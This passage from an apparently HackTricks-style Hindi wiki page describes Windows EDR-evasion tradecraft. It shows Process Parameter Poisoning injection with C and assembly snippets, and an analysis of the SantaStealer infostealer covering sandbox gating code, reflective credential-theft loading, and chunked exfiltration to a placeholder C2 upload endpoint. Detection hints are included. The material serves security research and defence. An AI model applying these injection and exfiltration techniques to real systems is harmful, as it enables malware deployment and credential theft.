- ऐसे remote threads या context pivots जो किसी legitimate DLL export के अंदर से execution शुरू करते हैं, जिसके शुरुआती bytes हाल ही में संशोधित किए गए हों।
- DLL `.text` pages पर `VirtualProtect(Ex)` / `WriteProcessMemory` की संदिग्ध sequences, जिनके बाद thread creation हो।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows **चुने हुए `CreateProcessW` startup parameters को child process में copy करता है** और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) में संग्रहीत करता है।<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` द्वारा copy किए जाने वाले Poisonable carriers

उपयोगी carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` के साथ) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

व्यावहारिक carrier सीमाएँ:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए, और इसकी सीमा null terminator सहित **32,767 Unicode characters** है।
- `lpEnvironment` एक Unicode environment block होना चाहिए, जिसमें लगातार `NAME=VALUE\0` strings हों और अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` आधिकारिक तौर पर reserved है, इसलिए `ShellInfo` mapping को स्थिर, documented contract के बजाय implementation detail मानना चाहिए।

इससे सामान्य process creation ही **payload-transfer primitive** बन जाता है। Operator attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote write APIs के बिना remote lookup flow

Child बनने के बाद, **read-only** primitives से copied buffer को resolve करें:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` तक जाएँ
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. चुने हुए pointer का उपयोग करें:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

न्यूनतम flow:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### कॉपी किए गए पैरामीटर बफ़र को execute करना

कॉपी किया गया पैरामीटर क्षेत्र आमतौर पर `RW` होता है, executable नहीं। एक सामान्य P3 chain यह है:

1. प्रोसेस को सामान्य रूप से बनाएँ (suspended नहीं)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` से चुने गए पैरामीटर पेज को executable बनाएँ
3. `PROCESS_INFORMATION` में पहले से लौटे main thread handle का पुनः उपयोग करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` को overwrite करें) से execution को redirect करें

क्लासिक thread hijacking workflows के विपरीत, इसके लिए `SuspendThread` / `ResumeThread` की **ज़रूरत नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आमतौर पर monitor किए जाने वाले कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` भी

### Null-byte सीमा और staged shellcode

तीनों carriers **string या string-जैसे data** हैं, इसलिए `0x00` वाला raw payload transfer के दौरान truncate हो जाता है। इसका एक व्यावहारिक उपाय है **null-free first stage**, जो runtime पर constants को फिर से बनाता है और फिर कोई भी arbitrary second stage लोड करता है।

एक सरल pattern XOR-आधारित constant synthesis है:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

इससे first stage, transported parameter में null bytes एम्बेड किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बना सकता है।

### First stage से stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs कॉल करने हों, तो यह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` से उसे `PAGE_EXECUTE_READ` में बदला जा सकता है और फिर उस पर jump किया जा सकता है—इससे सीधे RWX allocation की ज़रूरत नहीं पड़ती।

### Detection के विचार

लेखकों द्वारा बताए गए अच्छे hunting अवसर:

- `VirtualProtectEx` / `NtProtectVirtualMemory` द्वारा **process-parameter pages को executable बनाना**
- protection में इस बदलाव के बाद `SetThreadContext` / `NtSetContextThread का इस्तेमाल
- `PEB` और फिर `RTL_USER_PROCESS_PARAMETERS` को remote read करना
- process creation के दौरान असामान्य रूप से लंबी / high-entropy `lpCommandLine`, `lpEnvironment`, या `STARTUPINFO.lpReserved` values

### Notes

- P3 एक **cross-process transfer trick** है, अपने आप में पूर्ण execution primitive नहीं: copy किए गए parameter को अब भी execute permission में बदलाव और execution redirection method की ज़रूरत होती है।
- लेखकों ने `RtlCreateProcessReflection` / Dirty Vanity पर विचार किया, लेकिन इसे अस्वीकार कर दिया क्योंकि यह आंतरिक रूप से `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे संदिग्ध primitives का इस्तेमाल करता है।

## Fileless Evasion और Credential Theft के लिए SantaStealer Tradecraft

SantaStealer (aka BluelineStealer) दिखाता है कि आधुनिक info-stealers AV bypass, anti-analysis और credential access को एक ही workflow में कैसे मिलाते हैं।<sup>[[24]](#references)</sup>

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`), `GetKeyboardLayoutList` के ज़रिए इंस्टॉल किए गए keyboard layouts की सूची बनाता है। अगर कोई Cyrillic layout मिलता है, तो sample एक खाली `CIS` marker बनाकर terminate हो जाता है—इससे यह सुनिश्चित होता है कि excluded locales पर यह कभी detonate न हो, जबकि hunting के लिए एक artifact छोड़ जाता है।

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### स्तरित `check_antivm` लॉजिक

- Variant A process list पर चलता है, हर नाम का custom rolling checksum निकालता है और उसे debuggers/sandboxes की embedded blocklists से मिलाता है; फिर computer name पर checksum दोहराता है और `C:\analysis` जैसी working directories जाँचता है।
- Variant B system properties (process-count floor, हाल का uptime) जाँचता है, VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` कॉल करता है, और single-stepping का पता लगाने के लिए sleeps के आसपास timing checks करता है। कोई भी hit होने पर modules launch होने से पहले प्रक्रिया abort हो जाती है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper embedded होता है, जिसे या तो disk पर drop किया जाता है या memory में manually map किया जाता है; fileless mode में helper अपने imports/relocations resolve करता है, इसलिए कोई helper artifacts नहीं लिखे जाते।
- वह helper ChaCha20 से दो बार encrypted second-stage DLL संग्रहीत करता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, वह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से लिए गए `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports कॉल करता है।<sup>[[25]](#references)</sup>
- ChromElevator routines direct-syscall reflective process hollowing का उपयोग करके live Chromium browser में inject होते हैं, AppBound Encryption keys inherit करते हैं, और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करते हैं।

### Modular in-memory collection और chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions आदि) के लिए एक thread spawn करता है। हर thread results को shared buffers में लिखता है और लगभग 45s के join window के बाद अपनी file count बताता है।
- पूरा होने पर, सब कुछ statically linked `miniz` library से `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s सोता है और archive को HTTP POST के ज़रिए 10 MB chunks में `http://<C2>:6767/upload` पर stream करता है; इसमें browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) spoof की जाती है। हर chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` शामिल होता है, और आखिरी chunk में `complete: true` जोड़ा जाता है, ताकि C2 को पता चले कि reassembly पूरी हो गई है।

## References

- [1] [उन्नत Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ब्लॉग](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: malware को अब मुफ्त में रास्ता नहीं मिलेगा](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer के लिए नई Infection Chain और ConfuserEx-आधारित Obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – क्या आपको अपने zero trust पर भरोसा करना चाहिए? Zscaler posture checks को bypass करना](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell से पहले: Storm-2603 के पिछले Ransomware Operations की पड़ताल](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Exports का दुरुपयोग](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security और access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) के सहारे EDRs का मुकाबला](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique से Windows Defender के Protective Shell को तोड़ना](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain के पीछे: RAT से Builder और फिर Coder तक](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer आने वाला है: एक नया, महत्वाकांक्षी Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing से Node.js Malware को विफल करना](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace से Adaptix को सुलाना](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET और Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - अपने Dotnet Etw को छिपाना](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations में Chrome Remote Desktop का दुरुपयोग: एक व्यावहारिक मार्गदर्शिका](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender के Remediation Driver को Kernel Operation Primitive के रूप में weaponize करना](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo का companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM का उपयोग करके Self-Masking Functions बनाना](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
